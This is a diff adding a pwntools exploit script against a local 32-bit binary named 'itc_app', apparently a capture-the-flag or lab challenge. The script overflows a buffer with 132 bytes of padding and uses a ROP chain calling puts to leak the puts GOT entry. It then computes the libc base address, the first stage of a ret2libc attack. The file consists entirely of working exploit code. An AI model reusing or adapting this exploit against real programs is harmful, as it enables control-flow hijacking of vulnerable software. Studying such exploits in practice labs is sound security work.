@@ -1,0 +1,35 @@
+from pwn import *
+
+elf = context.binary = ELF('./itc_app')  # Correct the path if necessary
+libc = elf.libc
+p = process()
+
+# Discard lines up to the point where the address might be leaked
+p.recvline()
+
+payload = flat(
+    b'A' * 132,
+    elf.plt['puts'],  # puts@plt
+    elf.sym['main'],  # Jump back to main for another chance
+    elf.got['puts']   # puts@got to leak its runtime address
+)
+
+# Send the payload
+p.sendline(payload)
+
+# Attempt to read exactly 4 bytes for the address
+try:
+    puts_leak = p.recv(4)
+    if len(puts_leak) < 4:
+        raise ValueError("Received fewer than 4 bytes for the address leak.")
+except EOFError:
+    log.error("Got EOF while trying to read the leaked address.")
+    p.close()
+    exit()
+
+# Unpack the address
+puts_leak = u32(puts_leak)
+libc_base = puts_leak - libc.sym['puts']
+log.success(f'LIBC base: {hex(libc_base)}')
+
+p.close()
